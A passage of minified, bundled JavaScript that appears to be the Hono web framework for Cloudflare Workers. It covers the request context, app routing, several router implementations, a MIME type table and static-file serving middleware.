}, "_t"), Bt = /* @__PURE__ */ __name(function() {
  const e = {}, t = Object.keys(m(this, Y)[0][this.routeIndex][1]);
  for (const s of t) {
    const a = R(this, ne, nt).call(this, m(this, Y)[0][this.routeIndex][1][s]);
    a !== void 0 && (e[s] = /\%/.test(a) ? ft(a) : a);
  }
  return e;
}, "Bt"), nt = /* @__PURE__ */ __name(function(e) {
  return m(this, Y)[1] ? m(this, Y)[1][e] : e;
}, "nt"), re = /* @__PURE__ */ new WeakMap(), ht);
var la = { Stringify: 1 };
var Rt = /* @__PURE__ */ __name(async (e, t, s, a, i) => {
  typeof e == "object" && !(e instanceof String) && (e instanceof Promise || (e = e.toString()), e instanceof Promise && (e = await e));
  const n = e.callbacks;
  return n != null && n.length ? (i ? i[0] += e : i = [e], Promise.all(n.map((o) => o({ phase: t, buffer: i, context: a }))).then((o) => Promise.all(o.filter(Boolean).map((d) => Rt(d, t, false, a, i))).then(() => i[0]))) : Promise.resolve(e);
}, "Rt");
var ca = "text/plain; charset=UTF-8";
var st = /* @__PURE__ */ __name((e, t) => ({ "Content-Type": e, ...t }), "st");
var Oe = /* @__PURE__ */ __name((e, t) => new Response(e, t), "Oe");
var je;
var ze;
var Z;
var Pe;
var ee;
var U;
var Ke;
var Ce;
var _e;
var ge;
var Ue;
var Xe;
var oe;
var Te;
var vt;
var pa = (vt = class {
  static {
    __name(this, "vt");
  }
  constructor(e, t) {
    C(this, oe);
    C(this, je);
    C(this, ze);
    A(this, "env", {});
    C(this, Z);
    A(this, "finalized", false);
    A(this, "error");
    C(this, Pe);
    C(this, ee);
    C(this, U);
    C(this, Ke);
    C(this, Ce);
    C(this, _e);
    C(this, ge);
    C(this, Ue);
    C(this, Xe);
    A(this, "render", (...e2) => (m(this, Ce) ?? E(this, Ce, (t2) => this.html(t2)), m(this, Ce).call(this, ...e2)));
    A(this, "setLayout", (e2) => E(this, Ke, e2));
    A(this, "getLayout", () => m(this, Ke));
    A(this, "setRenderer", (e2) => {
      E(this, Ce, e2);
    });
    A(this, "header", (e2, t2, s) => {
      this.finalized && E(this, U, Oe(m(this, U).body, m(this, U)));
      const a = m(this, U) ? m(this, U).headers : m(this, ge) ?? E(this, ge, new Headers());
      t2 === void 0 ? a.delete(e2) : s != null && s.append ? a.append(e2, t2) : a.set(e2, t2);
    });
    A(this, "status", (e2) => {
      E(this, Pe, e2);
    });
    A(this, "set", (e2, t2) => {
      m(this, Z) ?? E(this, Z, /* @__PURE__ */ new Map()), m(this, Z).set(e2, t2);
    });
    A(this, "get", (e2) => m(this, Z) ? m(this, Z).get(e2) : void 0);
    A(this, "newResponse", (...e2) => R(this, oe, Te).call(this, ...e2));
    A(this, "body", (e2, t2, s) => R(this, oe, Te).call(this, e2, t2, s));
    A(this, "text", (e2, t2, s) => !m(this, ge) && !m(this, Pe) && !t2 && !s && !this.finalized ? new Response(e2) : R(this, oe, Te).call(this, e2, t2, st(ca, s)));
    A(this, "json", (e2, t2, s) => R(this, oe, Te).call(this, JSON.stringify(e2), t2, st("application/json", s)));
    A(this, "html", (e2, t2, s) => {
      const a = /* @__PURE__ */ __name((i) => R(this, oe, Te).call(this, i, t2, st("text/html; charset=UTF-8", s)), "a");
      return typeof e2 == "object" ? Rt(e2, la.Stringify, false, {}).then(a) : a(e2);
    });
    A(this, "redirect", (e2, t2) => {
      const s = String(e2);
      return this.header("Location", /[^\x00-\xFF]/.test(s) ? encodeURI(s) : s), this.newResponse(null, t2 ?? 302);
    });
    A(this, "notFound", () => (m(this, _e) ?? E(this, _e, () => Oe()), m(this, _e).call(this, this)));
    E(this, je, e), t && (E(this, ee, t.executionCtx), this.env = t.env, E(this, _e, t.notFoundHandler), E(this, Xe, t.path), E(this, Ue, t.matchResult));
  }
  get req() {
    return m(this, ze) ?? E(this, ze, new Ct(m(this, je), m(this, Xe), m(this, Ue))), m(this, ze);
  }
  get event() {
    if (m(this, ee) && "respondWith" in m(this, ee)) return m(this, ee);
    throw Error("This context has no FetchEvent");
  }
  get executionCtx() {
    if (m(this, ee)) return m(this, ee);
    throw Error("This context has no ExecutionContext");
  }
  get res() {
    return m(this, U) || E(this, U, Oe(null, { headers: m(this, ge) ?? E(this, ge, new Headers()) }));
  }
  set res(e) {
    if (m(this, U) && e) {
      e = Oe(e.body, e);
      for (const [t, s] of m(this, U).headers.entries()) if (t !== "content-type") if (t === "set-cookie") {
        const a = m(this, U).headers.getSetCookie();
        e.headers.delete("set-cookie");
        for (const i of a) e.headers.append("set-cookie", i);
      } else e.headers.set(t, s);
    }
    E(this, U, e), this.finalized = true;
  }
  get var() {
    return m(this, Z) ? Object.fromEntries(m(this, Z)) : {};
  }
}, je = /* @__PURE__ */ new WeakMap(), ze = /* @__PURE__ */ new WeakMap(), Z = /* @__PURE__ */ new WeakMap(), Pe = /* @__PURE__ */ new WeakMap(), ee = /* @__PURE__ */ new WeakMap(), U = /* @__PURE__ */ new WeakMap(), Ke = /* @__PURE__ */ new WeakMap(), Ce = /* @__PURE__ */ new WeakMap(), _e = /* @__PURE__ */ new WeakMap(), ge = /* @__PURE__ */ new WeakMap(), Ue = /* @__PURE__ */ new WeakMap(), Xe = /* @__PURE__ */ new WeakMap(), oe = /* @__PURE__ */ new WeakSet(), Te = /* @__PURE__ */ __name(function(e, t, s) {
  const a = m(this, U) ? new Headers(m(this, U).headers) : m(this, ge) ?? new Headers();
  if (typeof t == "object" && "headers" in t) {
    const n = t.headers instanceof Headers ? t.headers : new Headers(t.headers);
    for (const [r, o] of n) r.toLowerCase() === "set-cookie" ? a.append(r, o) : a.set(r, o);
  }
  if (s) for (const [n, r] of Object.entries(s)) if (typeof r == "string") a.set(n, r);
  else {
    a.delete(n);
    for (const o of r) a.append(n, o);
  }
  const i = typeof t == "number" ? t : (t == null ? void 0 : t.status) ?? m(this, Pe);
  return Oe(e, { status: i, headers: a });
}, "Te"), vt);
var q = "ALL";
var ua = "all";
var fa = ["get", "post", "put", "delete", "options", "patch"];
var Dt = "Can not add a route since the matcher is already built.";
var Nt = class extends Error {
  static {
    __name(this, "Nt");
  }
};
var ma = "__COMPOSED_HANDLER";
var ga = /* @__PURE__ */ __name((e) => e.text("404 Not Found", 404), "ga");
var mt = /* @__PURE__ */ __name((e, t) => {
  if ("getResponse" in e) {
    const s = e.getResponse();
    return t.newResponse(s.body, s);
  }
  return console.error(e), t.text("Internal Server Error", 500);
}, "mt");
var J;
var H;
var Lt;
var V;
var fe;
var Ge;
var Ye;
var Be;
var ba = (Be = class {
  static {
    __name(this, "Be");
  }
  constructor(t = {}) {
    C(this, H);
    A(this, "get");
    A(this, "post");
    A(this, "put");
    A(this, "delete");
    A(this, "options");
    A(this, "patch");
    A(this, "all");
    A(this, "on");
    A(this, "use");
    A(this, "router");
    A(this, "getPath");
    A(this, "_basePath", "/");
    C(this, J, "/");
    A(this, "routes", []);
    C(this, V, ga);
    A(this, "errorHandler", mt);
    A(this, "onError", (t2) => (this.errorHandler = t2, this));
    A(this, "notFound", (t2) => (E(this, V, t2), this));
    A(this, "fetch", (t2, ...s) => R(this, H, Ye).call(this, t2, s[1], s[0], t2.method));
    A(this, "request", (t2, s, a2, i2) => t2 instanceof Request ? this.fetch(s ? new Request(t2, s) : t2, a2, i2) : (t2 = t2.toString(), this.fetch(new Request(/^https?:\/\//.test(t2) ? t2 : `http://localhost${Se("/", t2)}`, s), a2, i2)));
    A(this, "fire", () => {
      addEventListener("fetch", (t2) => {
        t2.respondWith(R(this, H, Ye).call(this, t2.request, t2, void 0, t2.request.method));
      });
    });
    [...fa, ua].forEach((n) => {
      this[n] = (r, ...o) => (typeof r == "string" ? E(this, J, r) : R(this, H, fe).call(this, n, m(this, J), r), o.forEach((d) => {
        R(this, H, fe).call(this, n, m(this, J), d);
      }), this);
    }), this.on = (n, r, ...o) => {
      for (const d of [r].flat()) {
        E(this, J, d);
        for (const u of [n].flat()) o.map((b) => {
          R(this, H, fe).call(this, u.toUpperCase(), m(this, J), b);
        });
      }
      return this;
    }, this.use = (n, ...r) => (typeof n == "string" ? E(this, J, n) : (E(this, J, "*"), r.unshift(n)), r.forEach((o) => {
      R(this, H, fe).call(this, q, m(this, J), o);
    }), this);
    const { strict: a, ...i } = t;
    Object.assign(this, i), this.getPath = a ?? true ? t.getPath ?? It : ra;
  }
  route(t, s) {
    const a = this.basePath(t);
    return s.routes.map((i) => {
      var r;
      let n;
      s.errorHandler === mt ? n = i.handler : (n = /* @__PURE__ */ __name(async (o, d) => (await ut([], s.errorHandler)(o, () => i.handler(o, d))).res, "n"), n[ma] = i.handler), R(r = a, H, fe).call(r, i.method, i.path, n);
    }), this;
  }
  basePath(t) {
    const s = R(this, H, Lt).call(this);
    return s._basePath = Se(this._basePath, t), s;
  }
  mount(t, s, a) {
    let i, n;
    a && (typeof a == "function" ? n = a : (n = a.optionHandler, a.replaceRequest === false ? i = /* @__PURE__ */ __name((d) => d, "i") : i = a.replaceRequest));
    const r = n ? (d) => {
      const u = n(d);
      return Array.isArray(u) ? u : [u];
    } : (d) => {
      let u;
      try {
        u = d.executionCtx;
      } catch {
      }
      return [d.env, u];
    };
    i || (i = (() => {
      const d = Se(this._basePath, t), u = d === "/" ? 0 : d.length;
      return (b) => {
        const l = new URL(b.url);
        return l.pathname = l.pathname.slice(u) || "/", new Request(l, b);
      };
    })());
    const o = /* @__PURE__ */ __name(async (d, u) => {
      const b = await s(i(d.req.raw), ...r(d));
      if (b) return b;
      await u();
    }, "o");
    return R(this, H, fe).call(this, q, Se(t, "*"), o), this;
  }
}, J = /* @__PURE__ */ new WeakMap(), H = /* @__PURE__ */ new WeakSet(), Lt = /* @__PURE__ */ __name(function() {
  const t = new Be({ router: this.router, getPath: this.getPath });
  return t.errorHandler = this.errorHandler, E(t, V, m(this, V)), t.routes = this.routes, t;
}, "Lt"), V = /* @__PURE__ */ new WeakMap(), fe = /* @__PURE__ */ __name(function(t, s, a) {
  t = t.toUpperCase(), s = Se(this._basePath, s);
  const i = { basePath: this._basePath, path: s, method: t, handler: a };
  this.router.add(t, s, [a, i]), this.routes.push(i);
}, "fe"), Ge = /* @__PURE__ */ __name(function(t, s) {
  if (t instanceof Error) return this.errorHandler(t, s);
  throw t;
}, "Ge"), Ye = /* @__PURE__ */ __name(function(t, s, a, i) {
  if (i === "HEAD") return (async () => new Response(null, await R(this, H, Ye).call(this, t, s, a, "GET")))();
  const n = this.getPath(t, { env: a }), r = this.router.match(i, n), o = new pa(t, { path: n, matchResult: r, env: a, executionCtx: s, notFoundHandler: m(this, V) });
  if (r[0].length === 1) {
    let u;
    try {
      u = r[0][0][0][0](o, async () => {
        o.res = await m(this, V).call(this, o);
      });
    } catch (b) {
      return R(this, H, Ge).call(this, b, o);
    }
    return u instanceof Promise ? u.then((b) => b || (o.finalized ? o.res : m(this, V).call(this, o))).catch((b) => R(this, H, Ge).call(this, b, o)) : u ?? m(this, V).call(this, o);
  }
  const d = ut(r[0], this.errorHandler, m(this, V));
  return (async () => {
    try {
      const u = await d(o);
      if (!u.finalized) throw new Error("Context is not finalized. Did you forget to return a Response object or `await next()`?");
      return u.res;
    } catch (u) {
      return R(this, H, Ge).call(this, u, o);
    }
  })();
}, "Ye"), Be);
var Ot = [];
function ha(e, t) {
  const s = this.buildAllMatchers(), a = /* @__PURE__ */ __name(((i, n) => {
    const r = s[i] || s[q], o = r[2][n];
    if (o) return o;
    const d = n.match(r[0]);
    if (!d) return [[], Ot];
    const u = d.indexOf("", 1);
    return [r[1][u], d];
  }), "a");
  return this.match = a, a(e, t);
}
__name(ha, "ha");
var Ve = "[^/]+";
var qe = ".*";
var He = "(?:|/.*)";
var Ie = /* @__PURE__ */ Symbol();
var va = new Set(".\\+*[^]$()");
function ya(e, t) {
  return e.length === 1 ? t.length === 1 ? e < t ? -1 : 1 : -1 : t.length === 1 || e === qe || e === He ? 1 : t === qe || t === He ? -1 : e === Ve ? 1 : t === Ve ? -1 : e.length === t.length ? e < t ? -1 : 1 : t.length - e.length;
}
__name(ya, "ya");
var be;
var he;
var W;
var xe;
var ka = (xe = class {
  static {
    __name(this, "xe");
  }
  constructor() {
    C(this, be);
    C(this, he);
    C(this, W, /* @__PURE__ */ Object.create(null));
  }
  insert(t, s, a, i, n) {
    if (t.length === 0) {
      if (m(this, be) !== void 0) throw Ie;
      if (n) return;
      E(this, be, s);
      return;
    }
    const [r, ...o] = t, d = r === "*" ? o.length === 0 ? ["", "", qe] : ["", "", Ve] : r === "/*" ? ["", "", He] : r.match(/^\:([^\{\}]+)(?:\{(.+)\})?$/);
    let u;
    if (d) {
      const b = d[1];
      let l = d[2] || Ve;
      if (b && d[2] && (l === ".*" || (l = l.replace(/^\((?!\?:)(?=[^)]+\)$)/, "(?:"), /\((?!\?:)/.test(l)))) throw Ie;
      if (u = m(this, W)[l], !u) {
        if (Object.keys(m(this, W)).some((c) => c !== qe && c !== He)) throw Ie;
        if (n) return;
        u = m(this, W)[l] = new xe(), b !== "" && E(u, he, i.varIndex++);
      }
      !n && b !== "" && a.push([b, m(u, he)]);
    } else if (u = m(this, W)[r], !u) {
      if (Object.keys(m(this, W)).some((b) => b.length > 1 && b !== qe && b !== He)) throw Ie;
      if (n) return;
      u = m(this, W)[r] = new xe();
    }
    u.insert(o, s, a, i, n);
  }
  buildRegExpStr() {
    const s = Object.keys(m(this, W)).sort(ya).map((a) => {
      const i = m(this, W)[a];
      return (typeof m(i, he) == "number" ? `(${a})@${m(i, he)}` : va.has(a) ? `\\${a}` : a) + i.buildRegExpStr();
    });
    return typeof m(this, be) == "number" && s.unshift(`#${m(this, be)}`), s.length === 0 ? "" : s.length === 1 ? s[0] : "(?:" + s.join("|") + ")";
  }
}, be = /* @__PURE__ */ new WeakMap(), he = /* @__PURE__ */ new WeakMap(), W = /* @__PURE__ */ new WeakMap(), xe);
var We;
var $e;
var yt;
var xa = (yt = class {
  static {
    __name(this, "yt");
  }
  constructor() {
    C(this, We, { varIndex: 0 });
    C(this, $e, new ka());
  }
  insert(e, t, s) {
    const a = [], i = [];
    for (let r = 0; ; ) {
      let o = false;
      if (e = e.replace(/\{[^}]+\}/g, (d) => {
        const u = `@\\${r}`;
        return i[r] = [u, d], r++, o = true, u;
      }), !o) break;
    }
    const n = e.match(/(?::[^\/]+)|(?:\/\*$)|./g) || [];
    for (let r = i.length - 1; r >= 0; r--) {
      const [o] = i[r];
      for (let d = n.length - 1; d >= 0; d--) if (n[d].indexOf(o) !== -1) {
        n[d] = n[d].replace(o, i[r][1]);
        break;
      }
    }
    return m(this, $e).insert(n, t, a, m(this, We), s), a;
  }
  buildRegExp() {
    let e = m(this, $e).buildRegExpStr();
    if (e === "") return [/^$/, [], []];
    let t = 0;
    const s = [], a = [];
    return e = e.replace(/#(\d+)|@(\d+)|\.\*\$/g, (i, n, r) => n !== void 0 ? (s[++t] = Number(n), "$()") : (r !== void 0 && (a[Number(r)] = ++t), "")), [new RegExp(`^${e}`), s, a];
  }
}, We = /* @__PURE__ */ new WeakMap(), $e = /* @__PURE__ */ new WeakMap(), yt);
var wa = [/^$/, [], /* @__PURE__ */ Object.create(null)];
var Je = /* @__PURE__ */ Object.create(null);
function Mt(e) {
  return Je[e] ?? (Je[e] = new RegExp(e === "*" ? "" : `^${e.replace(/\/\*$|([.\\+*[^\]$()])/g, (t, s) => s ? `\\${s}` : "(?:|/.*)")}$`));
}
__name(Mt, "Mt");
function Sa() {
  Je = /* @__PURE__ */ Object.create(null);
}
__name(Sa, "Sa");
function Ta(e) {
  var u;
  const t = new xa(), s = [];
  if (e.length === 0) return wa;
  const a = e.map((b) => [!/\*|\/:/.test(b[0]), ...b]).sort(([b, l], [c, f]) => b ? 1 : c ? -1 : l.length - f.length), i = /* @__PURE__ */ Object.create(null);
  for (let b = 0, l = -1, c = a.length; b < c; b++) {
    const [f, g, h] = a[b];
    f ? i[g] = [h.map(([y]) => [y, /* @__PURE__ */ Object.create(null)]), Ot] : l++;
    let k;
    try {
      k = t.insert(g, l, f);
    } catch (y) {
      throw y === Ie ? new Nt(g) : y;
    }
    f || (s[l] = h.map(([y, p]) => {
      const w = /* @__PURE__ */ Object.create(null);
      for (p -= 1; p >= 0; p--) {
        const [v, T] = k[p];
        w[v] = T;
      }
      return [y, w];
    }));
  }
  const [n, r, o] = t.buildRegExp();
  for (let b = 0, l = s.length; b < l; b++) for (let c = 0, f = s[b].length; c < f; c++) {
    const g = (u = s[b][c]) == null ? void 0 : u[1];
    if (!g) continue;
    const h = Object.keys(g);
    for (let k = 0, y = h.length; k < y; k++) g[h[k]] = o[g[h[k]]];
  }
  const d = [];
  for (const b in r) d[b] = s[r[b]];
  return [n, d, i];
}
__name(Ta, "Ta");
function we(e, t) {
  if (e) {
    for (const s of Object.keys(e).sort((a, i) => i.length - a.length)) if (Mt(s).test(t)) return [...e[s]];
  }
}
__name(we, "we");
var de;
var le;
var Qe;
var qt;
var kt;
var Ia = (kt = class {
  static {
    __name(this, "kt");
  }
  constructor() {
    C(this, Qe);
    A(this, "name", "RegExpRouter");
    C(this, de);
    C(this, le);
    A(this, "match", ha);
    E(this, de, { [q]: /* @__PURE__ */ Object.create(null) }), E(this, le, { [q]: /* @__PURE__ */ Object.create(null) });
  }
  add(e, t, s) {
    var o;
    const a = m(this, de), i = m(this, le);
    if (!a || !i) throw new Error(Dt);
    a[e] || [a, i].forEach((d) => {
      d[e] = /* @__PURE__ */ Object.create(null), Object.keys(d[q]).forEach((u) => {
        d[e][u] = [...d[q][u]];
      });
    }), t === "/*" && (t = "*");
    const n = (t.match(/\/:/g) || []).length;
    if (/\*$/.test(t)) {
      const d = Mt(t);
      e === q ? Object.keys(a).forEach((u) => {
        var b;
        (b = a[u])[t] || (b[t] = we(a[u], t) || we(a[q], t) || []);
      }) : (o = a[e])[t] || (o[t] = we(a[e], t) || we(a[q], t) || []), Object.keys(a).forEach((u) => {
        (e === q || e === u) && Object.keys(a[u]).forEach((b) => {
          d.test(b) && a[u][b].push([s, n]);
        });
      }), Object.keys(i).forEach((u) => {
        (e === q || e === u) && Object.keys(i[u]).forEach((b) => d.test(b) && i[u][b].push([s, n]));
      });
      return;
    }
    const r = Et(t) || [t];
    for (let d = 0, u = r.length; d < u; d++) {
      const b = r[d];
      Object.keys(i).forEach((l) => {
        var c;
        (e === q || e === l) && ((c = i[l])[b] || (c[b] = [...we(a[l], b) || we(a[q], b) || []]), i[l][b].push([s, n - u + d + 1]));
      });
    }
  }
  buildAllMatchers() {
    const e = /* @__PURE__ */ Object.create(null);
    return Object.keys(m(this, le)).concat(Object.keys(m(this, de))).forEach((t) => {
      e[t] || (e[t] = R(this, Qe, qt).call(this, t));
    }), E(this, de, E(this, le, void 0)), Sa(), e;
  }
}, de = /* @__PURE__ */ new WeakMap(), le = /* @__PURE__ */ new WeakMap(), Qe = /* @__PURE__ */ new WeakSet(), qt = /* @__PURE__ */ __name(function(e) {
  const t = [];
  let s = e === q;
  return [m(this, de), m(this, le)].forEach((a) => {
    const i = a[e] ? Object.keys(a[e]).map((n) => [n, a[e][n]]) : [];
    i.length !== 0 ? (s || (s = true), t.push(...i)) : e !== q && t.push(...Object.keys(a[q]).map((n) => [n, a[q][n]]));
  }), s ? Ta(t) : null;
}, "qt"), kt);
var ce;
var te;
var xt;
var Ea = (xt = class {
  static {
    __name(this, "xt");
  }
  constructor(e) {
    A(this, "name", "SmartRouter");
    C(this, ce, []);
    C(this, te, []);
    E(this, ce, e.routers);
  }
  add(e, t, s) {
    if (!m(this, te)) throw new Error(Dt);
    m(this, te).push([e, t, s]);
  }
  match(e, t) {
    if (!m(this, te)) throw new Error("Fatal error");
    const s = m(this, ce), a = m(this, te), i = s.length;
    let n = 0, r;
    for (; n < i; n++) {
      const o = s[n];
      try {
        for (let d = 0, u = a.length; d < u; d++) o.add(...a[d]);
        r = o.match(e, t);
      } catch (d) {
        if (d instanceof Nt) continue;
        throw d;
      }
      this.match = o.match.bind(o), E(this, ce, [o]), E(this, te, void 0);
      break;
    }
    if (n === i) throw new Error("Fatal error");
    return this.name = `SmartRouter + ${this.activeRouter.name}`, r;
  }
  get activeRouter() {
    if (m(this, te) || m(this, ce).length !== 1) throw new Error("No active router has been determined yet.");
    return m(this, ce)[0];
  }
}, ce = /* @__PURE__ */ new WeakMap(), te = /* @__PURE__ */ new WeakMap(), xt);
var Me = /* @__PURE__ */ Object.create(null);
var Aa = /* @__PURE__ */ __name((e) => {
  for (const t in e) return true;
  return false;
}, "Aa");
var pe;
var z;
var ve;
var Re;
var j;
var ae;
var me;
var De;
var Pa = (De = class {
  static {
    __name(this, "De");
  }
  constructor(t, s, a) {
    C(this, ae);
    C(this, pe);
    C(this, z);
    C(this, ve);
    C(this, Re, 0);
    C(this, j, Me);
    if (E(this, z, a || /* @__PURE__ */ Object.create(null)), E(this, pe, []), t && s) {
      const i = /* @__PURE__ */ Object.create(null);
      i[t] = { handler: s, possibleKeys: [], score: 0 }, E(this, pe, [i]);
    }
    E(this, ve, []);
  }
  insert(t, s, a) {
    E(this, Re, ++pt(this, Re)._);
    let i = this;
    const n = aa(s), r = [];
    for (let o = 0, d = n.length; o < d; o++) {
      const u = n[o], b = n[o + 1], l = ia(u, b), c = Array.isArray(l) ? l[0] : u;
      if (c in m(i, z)) {
        i = m(i, z)[c], l && r.push(l[1]);
        continue;
      }
      m(i, z)[c] = new De(), l && (m(i, ve).push(l), r.push(l[1])), i = m(i, z)[c];
    }
    return m(i, pe).push({ [t]: { handler: a, possibleKeys: r.filter((o, d, u) => u.indexOf(o) === d), score: m(this, Re) } }), i;
  }
  search(t, s) {
    var b;
    const a = [];
    E(this, j, Me);
    let n = [this];
    const r = St(s), o = [], d = r.length;
    let u = null;
    for (let l = 0; l < d; l++) {
      const c = r[l], f = l === d - 1, g = [];
      for (let k = 0, y = n.length; k < y; k++) {
        const p = n[k], w = m(p, z)[c];
        w && (E(w, j, m(p, j)), f ? (m(w, z)["*"] && R(this, ae, me).call(this, a, m(w, z)["*"], t, m(p, j)), R(this, ae, me).call(this, a, w, t, m(p, j))) : g.push(w));
        for (let v = 0, T = m(p, ve).length; v < T; v++) {
          const S = m(p, ve)[v], x = m(p, j) === Me ? {} : { ...m(p, j) };
          if (S === "*") {
            const _ = m(p, z)["*"];
            _ && (R(this, ae, me).call(this, a, _, t, m(p, j)), E(_, j, x), g.push(_));
            continue;
          }
          const [P, N, B] = S;
          if (!c && !(B instanceof RegExp)) continue;
          const O = m(p, z)[P];
          if (B instanceof RegExp) {
            if (u === null) {
              u = new Array(d);
              let M = s[0] === "/" ? 1 : 0;
              for (let ie = 0; ie < d; ie++) u[ie] = M, M += r[ie].length + 1;
            }
            const _ = s.substring(u[l]), L = B.exec(_);
            if (L) {
              if (x[N] = L[0], R(this, ae, me).call(this, a, O, t, m(p, j), x), Aa(m(O, z))) {
                E(O, j, x);
                const M = ((b = L[0].match(/\//)) == null ? void 0 : b.length) ?? 0;
                (o[M] || (o[M] = [])).push(O);
              }
              continue;
            }
          }
          (B === true || B.test(c)) && (x[N] = c, f ? (R(this, ae, me).call(this, a, O, t, x, m(p, j)), m(O, z)["*"] && R(this, ae, me).call(this, a, m(O, z)["*"], t, x, m(p, j))) : (E(O, j, x), g.push(O)));
        }
      }
      const h = o.shift();
      n = h ? g.concat(h) : g;
    }
    return a.length > 1 && a.sort((l, c) => l.score - c.score), [a.map(({ handler: l, params: c }) => [l, c])];
  }
}, pe = /* @__PURE__ */ new WeakMap(), z = /* @__PURE__ */ new WeakMap(), ve = /* @__PURE__ */ new WeakMap(), Re = /* @__PURE__ */ new WeakMap(), j = /* @__PURE__ */ new WeakMap(), ae = /* @__PURE__ */ new WeakSet(), me = /* @__PURE__ */ __name(function(t, s, a, i, n) {
  for (let r = 0, o = m(s, pe).length; r < o; r++) {
    const d = m(s, pe)[r], u = d[a] || d[q], b = {};
    if (u !== void 0 && (u.params = /* @__PURE__ */ Object.create(null), t.push(u), i !== Me || n && n !== Me)) for (let l = 0, c = u.possibleKeys.length; l < c; l++) {
      const f = u.possibleKeys[l], g = b[u.score];
      u.params[f] = n != null && n[f] && !g ? n[f] : i[f] ?? (n == null ? void 0 : n[f]), b[u.score] = true;
    }
  }
}, "me"), De);
var ye;
var wt;
var Ca = (wt = class {
  static {
    __name(this, "wt");
  }
  constructor() {
    A(this, "name", "TrieRouter");
    C(this, ye);
    E(this, ye, new Pa());
  }
  add(e, t, s) {
    const a = Et(t);
    if (a) {
      for (let i = 0, n = a.length; i < n; i++) m(this, ye).insert(e, a[i], s);
      return;
    }
    m(this, ye).insert(e, t, s);
  }
  match(e, t) {
    return m(this, ye).search(e, t);
  }
}, ye = /* @__PURE__ */ new WeakMap(), wt);
var Ht = class extends ba {
  static {
    __name(this, "Ht");
  }
  constructor(e = {}) {
    super(e), this.router = e.router ?? new Ea({ routers: [new Ia(), new Ca()] });
  }
};
var _a = /^\s*(?:text\/(?!event-stream(?:[;\s]|$))[^;\s]+|application\/(?:javascript|json|xml|xml-dtd|ecmascript|dart|postscript|rtf|tar|toml|vnd\.dart|vnd\.ms-fontobject|vnd\.ms-opentype|wasm|x-httpd-php|x-javascript|x-ns-proxy-autoconfig|x-sh|x-tar|x-virtualbox-hdd|x-virtualbox-ova|x-virtualbox-ovf|x-virtualbox-vbox|x-virtualbox-vdi|x-virtualbox-vhd|x-virtualbox-vmdk|x-www-form-urlencoded)|font\/(?:otf|ttf)|image\/(?:bmp|vnd\.adobe\.photoshop|vnd\.microsoft\.icon|vnd\.ms-dds|x-icon|x-ms-bmp)|message\/rfc822|model\/gltf-binary|x-shader\/x-fragment|x-shader\/x-vertex|[^;\s]+?\+(?:json|text|xml|yaml))(?:[;\s]|$)/i;
var gt = /* @__PURE__ */ __name((e, t = Ra) => {
  const s = /\.([a-zA-Z0-9]+?)$/, a = e.match(s);
  if (!a) return;
  let i = t[a[1].toLowerCase()];
  return i && i.startsWith("text") && (i += "; charset=utf-8"), i;
}, "gt");
var Ba = { aac: "audio/aac", avi: "video/x-msvideo", avif: "image/avif", av1: "video/av1", bin: "application/octet-stream", bmp: "image/bmp", css: "text/css", csv: "text/csv", eot: "application/vnd.ms-fontobject", epub: "application/epub+zip", gif: "image/gif", gz: "application/gzip", htm: "text/html", html: "text/html", ico: "image/x-icon", ics: "text/calendar", jpeg: "image/jpeg", jpg: "image/jpeg", js: "text/javascript", json: "application/json", jsonld: "application/ld+json", map: "application/json", mid: "audio/x-midi", midi: "audio/x-midi", mjs: "text/javascript", mp3: "audio/mpeg", mp4: "video/mp4", mpeg: "video/mpeg", oga: "audio/ogg", ogv: "video/ogg", ogx: "application/ogg", opus: "audio/opus", otf: "font/otf", pdf: "application/pdf", png: "image/png", rtf: "application/rtf", svg: "image/svg+xml", tif: "image/tiff", tiff: "image/tiff", ts: "video/mp2t", ttf: "font/ttf", txt: "text/plain", wasm: "application/wasm", webm: "video/webm", weba: "audio/webm", webmanifest: "application/manifest+json", webp: "image/webp", woff: "font/woff", woff2: "font/woff2", xhtml: "application/xhtml+xml", xml: "application/xml", zip: "application/zip", "3gp": "video/3gpp", "3g2": "video/3gpp2", gltf: "model/gltf+json", glb: "model/gltf-binary" };
var Ra = Ba;
var Da = /* @__PURE__ */ __name((...e) => {
  let t = e.filter((i) => i !== "").join("/");
  t = t.replace(new RegExp("(?<=\\/)\\/+", "g"), "");
  const s = t.split("/"), a = [];
  for (const i of s) i === ".." && a.length > 0 && a.at(-1) !== ".." ? a.pop() : i !== "." && a.push(i);
  return a.join("/") || ".";
}, "Da");
var jt = { br: ".br", zstd: ".zst", gzip: ".gz" };
var Na = Object.keys(jt);
var La = "index.html";
var Oa = /* @__PURE__ */ __name((e) => {
  const t = e.root ?? "./", s = e.path, a = e.join ?? Da;
  return async (i, n) => {
    var b, l, c, f;
    if (i.finalized) return n();
    let r;
    if (e.path) r = e.path;
    else try {
      if (r = Tt(i.req.path), /(?:^|[\/\\])\.{1,2}(?:$|[\/\\])|[\/\\]{2,}/.test(r)) throw new Error();
    } catch {
      return await ((b = e.onNotFound) == null ? void 0 : b.call(e, i.req.path, i)), n();
    }
    let o = a(t, !s && e.rewriteRequestPath ? e.rewriteRequestPath(r) : r);
    e.isDir && await e.isDir(o) && (o = a(o, La));
    const d = e.getContent;
    let u = await d(o, i);
    if (u instanceof Response) return i.newResponse(u.body, u);
    if (u) {
      const g = e.mimes && gt(o, e.mimes) || gt(o);
      if (i.header("Content-Type", g || "application/octet-stream"), e.precompressed && (!g || _a.test(g))) {
        const h = new Set((l = i.req.header("Accept-Encoding")) == null ? void 0 : l.split(",").map((k) => k.trim()));
        for (const k of Na) {
          if (!h.has(k)) continue;
          const y = await d(o + jt[k], i);
          if (y) {
            u = y, i.header("Content-Encoding", k), i.header("Vary", "Accept-Encoding", { append: true });
            break;
          }
        }
      }
      return await ((c = e.onFound) == null ? void 0 : c.call(e, o, i)), i.body(u);
    }
    await ((f = e.onNotFound) == null ? void 0 : f.call(e, o, i)), await n();
  };
}, "Oa");
var Ma = /* @__PURE__ */ __name(async (e, t) => {
  let s;
  t && t.manifest ? typeof t.manifest == "string" ? s = JSON.parse(t.manifest) : s = t.manifest : typeof __STATIC_CONTENT_MANIFEST == "string" ? s = JSON.parse(__STATIC_CONTENT_MANIFEST) : s = __STATIC_CONTENT_MANIFEST;
  let a;
  t && t.namespace ? a = t.namespace : a = __STATIC_CONTENT;
  const i = s[e];
  if (!i) return null;
  const n = await a.get(i, { type: "stream" });
  return n || null;
}, "Ma");
var qa = /* @__PURE__ */ __name((e) => async function(s, a) {
